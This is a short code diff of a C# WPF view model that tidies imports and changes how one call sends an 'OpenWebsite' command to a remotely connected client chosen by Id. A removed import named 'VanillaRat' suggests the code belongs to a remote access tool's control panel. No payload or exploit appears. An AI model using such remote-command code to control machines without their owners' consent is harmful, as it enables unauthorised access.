@@ -1,15 +1,9 @@
-﻿using Hangfire.Annotations;
-using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.Text;
 using System.Windows;
 using System.Windows.Input;
 using TaskManager.Command;
-using VanillaRat.Classes;
 using WpfApp15.ViewModel;
-
+using Serverr = Server.Server;
 namespace WpfApp15.Scripts
 {
     class BrowserModel : MainViewModel
@@ -26,7 +20,7 @@ namespace WpfApp15.Scripts
         }
         void OpenBrowser()
         {
-            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("OpenWebsite<{" + Url + "}>"));
+            Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("OpenWebsite<{" + Url + "}>"));
             TaskManager.ViewModel.BrowserActive = false;
         }
         public BrowserModel(Window window):base(window)
